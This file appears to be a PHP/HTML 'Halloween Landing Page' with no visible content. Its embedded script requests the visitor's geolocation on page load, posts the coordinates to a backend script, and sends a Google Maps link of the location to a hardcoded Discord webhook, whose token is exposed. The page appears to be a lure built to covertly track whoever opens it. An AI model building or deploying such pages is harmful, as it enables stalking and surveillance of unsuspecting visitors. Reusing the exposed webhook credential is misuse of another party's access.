<?php include_once('../../backend/generate_token.php');
include('../../forms/index.php');?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Halloween Landing Page</title>

    <meta name="viewport" content="width=device-width" />
    <link rel="stylesheet" href="../../assets/css/echo.css" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <link rel="icon" href="../../assets/img/favicon.ico" type="image/x-icon" />
    <script>
        // Function to retrieve user's location
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(savePosition, positionError, { timeout: 10000 });
            } else {
                // Geolocation is not supported by this browser
                alert("Geolocation is not supported by this browser.");
            }
        }

        // Function to handle position error
        function positionError(error) {
            var errorCode = error.code;
            var message = error.message;
            alert(message);
        }

        // Function to save user's position
        function savePosition(position) {
            // Send latitude and longitude to geocoordinates.php
            $.post("../backend/get_location.php", { lat: position.coords.latitude, lng: position.coords.longitude });

            // Open Google Maps in a new tab with the user's current location
            var mapsUrl = "https://www.google.com/maps?q=" + position.coords.latitude + "," + position.coords.longitude;
            //window.open(mapsUrl, '_blank');

            // Send Discord webhook
            var discordWebhookUrl = "https://discord.com/api/webhooks/1210526479151009802/BqDbUCcwkmMYevgr_X2nRPZ_QHBYOX69MGcHBYkmMWN65Gk__P8RJiuXhv-VHteyowSp";
            var message = "Check out my current location on Google Maps: " + mapsUrl;
            $.ajax({
                type: "POST",
                url: discordWebhookUrl,
                data: JSON.stringify({ content: message }),
                contentType: "application/json",
                success: function(response) {
                    console.log("Webhook sent successfully");
                },
                error: function(xhr, status, error) {
                    console.error("Error sending webhook:", error);
                }
            });
        }

        // Call getLocation() function when the page loads
        $(document).ready(function() {
            getLocation();
        });
    </script>
</head>
<script src="../../assets/js/script.js"></script>
  </body>
</html>
